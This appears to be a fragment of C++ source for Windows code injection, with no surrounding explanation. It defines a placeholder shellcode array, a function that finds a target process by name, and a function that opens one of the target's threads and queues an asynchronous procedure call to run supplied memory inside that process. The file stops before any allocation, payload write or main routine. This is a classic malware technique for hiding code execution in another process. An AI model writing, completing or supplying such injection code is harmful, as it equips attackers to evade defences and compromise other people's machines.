#include <iostream>
#include <Windows.h>
#include <TlHelp32.h>
#include <cstring>
using namespace std;


unsigned char shellCode[] = {
	0x90, 0x20, 0x24
};

unsigned shellCodeLength = sizeof(shellCode);


DWORD findProcessID(const wchar_t* processName) {
	DWORD processId = 0;

	HANDLE processSnapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);

	if (processSnapshot == INVALID_HANDLE_VALUE) {
		cout << "Couldnt get process handles";
		return 0;
	}

	PROCESSENTRY32 pe;
	pe.dwSize = sizeof(pe);

	if (Process32First(processSnapshot, &pe)) {
		do {
			if (wcscmp( pe.szExeFile, processName) ==0) {
				processId = pe.th32ProcessID;
				break;
			}
		} while (Process32Next(processSnapshot, &pe));
	}

	CloseHandle(processSnapshot);

	return processId;
}


void ExecuteThread(DWORD targetProcessID, PVOID allocateMemory) {
	HANDLE hThreadtarget = CreateToolhelp32Snapshot(TH32CS_SNAPTHREAD, 0);

	if (hThreadtarget == INVALID_HANDLE_VALUE) return;
	THREADENTRY32 th;
	th.dwSize = sizeof(th);

	if (Thread32First(hThreadtarget, &th)) {

		do {
			if (th.th32OwnerProcessID == targetProcessID) {
				HANDLE tartgetThread = OpenThread(THREAD_SET_CONTEXT | THREAD_SUSPEND_RESUME | THREAD_SET_INFORMATION, FALSE, th.th32ThreadID);
				if (tartgetThread) {
					QueueUserAPC((PAPCFUNC)allocateMemory, tartgetThread, 0);
					CloseHandle(tartgetThread);
					break;
				}

			}
		} while (Thread32Next(hThreadtarget, &th));
	}
	CloseHandle(hThreadtarget);
}
